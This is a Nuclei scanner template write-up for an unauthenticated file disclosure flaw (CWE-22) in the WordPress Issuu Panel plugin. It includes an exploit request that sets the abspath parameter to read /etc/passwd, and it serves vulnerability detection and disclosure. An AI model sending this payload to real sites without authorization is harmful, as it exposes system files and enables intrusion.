# Nuclei Template: Wordpress Plugin Issuu Panel Remote/Local File Inclusion
**Template ID:** issuu-panel-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`issuu-panel-lfi.yaml`)

## Vulnerability Information & PoC

## Description
The WordPress Issuu Plugin includes an arbitrary file disclosure vulnerability that allows unauthenticated attackers to disclose the content of local and remote files.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/issuu-panel/menu/documento/requests/ajax-docs.php?abspath=%2Fetc%2Fpasswd
```

## References
- https://cxsecurity.com/issue/WLB-2016030131
- https://wordpress.org/plugins/issuu-panel/
